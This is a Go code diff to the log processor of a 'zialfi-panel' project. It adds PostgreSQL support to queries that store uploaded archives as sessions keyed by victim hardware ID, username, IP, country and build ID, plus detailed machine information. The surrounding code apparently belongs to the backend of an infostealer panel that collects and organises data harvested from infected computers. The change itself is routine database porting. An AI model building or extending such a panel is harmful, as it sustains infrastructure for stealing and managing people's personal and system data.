@@ -6,21 +6,24 @@ import (
 	"database/sql"
 	"encoding/json"
 	"errors"
+	"fmt"
 	"os"
 	"path/filepath"
 	"strings"
 
 	"github.com/google/uuid"
+	"zialfi-panel/internal/db"
 	"zialfi-panel/internal/ws"
 )
 
 type LogProcessor struct {
-	db  *sql.DB
-	hub *ws.Hub
+	db       *sql.DB
+	hub      *ws.Hub
+	provider db.ProviderType
 }
 
-func NewLogProcessor(db *sql.DB, hub *ws.Hub) *LogProcessor {
-	return &LogProcessor{db: db, hub: hub}
+func NewLogProcessor(dbConn *sql.DB, hub *ws.Hub, provider db.ProviderType) *LogProcessor {
+	return &LogProcessor{db: dbConn, hub: hub, provider: provider}
 }
 
 func isValidPath(name string) bool {
@@ -332,8 +335,9 @@ func (p *LogProcessor) Process(archive []byte, metadataJSON string, ownerID stri
 	}
 	defer tx.Rollback()
 
-	_, err = tx.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, owner_id, created_at)
-		VALUES (?, '', ?, ?, ?, ?, ?, ?, datetime('now'))`,
+	insertSessions := db.Placeholders(p.provider, `INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, owner_id, created_at)
+		VALUES (?, '', ?, ?, ?, ?, ?, ?, `+db.Now(p.provider)+`)`)
+	_, err = tx.Exec(insertSessions,
 		sessionID, meta["hwid"], meta["os"], meta["username"], meta["ip"], meta["country"], ownerID)
 	if err != nil {
 		return "", err
@@ -431,14 +435,32 @@ func (p *LogProcessor) Process(archive []byte, metadataJSON string, ownerID stri
 
 	if systemInfoContent != "" {
 		info := parseSystemInfo(systemInfoContent)
-		_, err = tx.Exec(`INSERT OR REPLACE INTO system_info (session_id, cpu, gpu, ram, os, screen, hostname, local_ip, mac, public_ip, hwid, uptime)
-			VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
+		systemCols := []string{"cpu", "gpu", "ram", "os", "screen", "hostname", "local_ip", "mac", "public_ip", "hwid", "uptime"}
+		values := []any{
 			sessionID,
 			info["cpu"], info["gpu"], info["ram"], info["os"],
 			info["screen"], info["hostname"], info["local_ip"],
 			info["mac"], info["public_ip"], info["hwid"], info["uptime"],
-		)
-		if err != nil {
+		}
+		var q string
+		if p.provider == db.ProviderPostgres {
+			placeholders := make([]string, len(values))
+			for i := range placeholders { placeholders[i] = fmt.Sprintf("$%d", i+1) }
+			setClauses := make([]string, len(systemCols))
+			for i, c := range systemCols {
+				setClauses[i] = fmt.Sprintf("%s = EXCLUDED.%s", c, c)
+			}
+			q = fmt.Sprintf(`INSERT INTO system_info (session_id, %s) VALUES (%s)
+				ON CONFLICT (session_id) DO UPDATE SET %s`,
+				strings.Join(systemCols, ", "),
+				strings.Join(placeholders, ", "),
+				strings.Join(setClauses, ", "),
+			)
+		} else {
+			q = `INSERT OR REPLACE INTO system_info (session_id, cpu, gpu, ram, os, screen, hostname, local_ip, mac, public_ip, hwid, uptime)
+				VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`
+		}
+		if _, err = tx.Exec(q, values...); err != nil {
 			return "", err
 		}
 	}
